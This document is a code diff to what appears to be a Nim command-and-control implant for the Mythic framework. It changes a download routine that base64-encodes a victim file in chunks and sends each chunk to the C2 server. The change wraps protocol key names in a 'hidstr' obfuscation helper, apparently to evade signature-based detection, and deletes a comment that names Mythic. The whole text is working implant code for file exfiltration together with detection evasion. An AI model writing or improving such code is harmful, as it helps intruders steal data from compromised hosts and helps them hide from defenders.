@@ -26,27 +26,28 @@ proc downloadExecute(taskId: string, params: JsonNode, state: AgentState,
       let chunkEnd   = min((i + 1) * DownloadChunkSize, dataLen)
       let chunkB64   = encode(data[chunkStart ..< chunkEnd])
 
-      var dlNode = %*{
-        "total_chunks": totalChunks,
-        "chunk_num":    i + 1,
-        "chunk_data":   chunkB64,
-        "full_path":    fullPath,
-        "is_screenshot": false,
-      }
+      var dlNode = newJObject()
+      dlNode[hidstr("total_chunks")]  = %totalChunks
+      dlNode["chunk_num"]              = %(i + 1)
+      dlNode["chunk_data"]             = %chunkB64
+      dlNode["full_path"]              = %fullPath
+      dlNode[hidstr("is_screenshot")]  = %false
       if fileId.len > 0:
         dlNode["file_id"] = %fileId
 
-      let msg = %*{
-        "action": "post_response",
-        "responses": [%*{"task_id": taskId, "download": dlNode}],
-      }
+      var innerResp = newJObject()
+      innerResp[hidstr("task_id")] = %taskId
+      innerResp["download"]         = dlNode
+
+      var msg = newJObject()
+      msg["action"]    = %hidstr("post_response")
+      msg["responses"] = %[innerResp]
       let resp = send(msg)
       if resp.kind == JNull:
         return TaskResult(
           output: "Transfer failed at chunk " & $(i + 1),
           status: "error", completed: true)
 
-      ## Capture file_id from Mythic's first response
       if i == 0 and fileId.len == 0:
         let responses = resp{"responses"}
         if not responses.isNil and responses.kind == JArray and responses.len > 0:
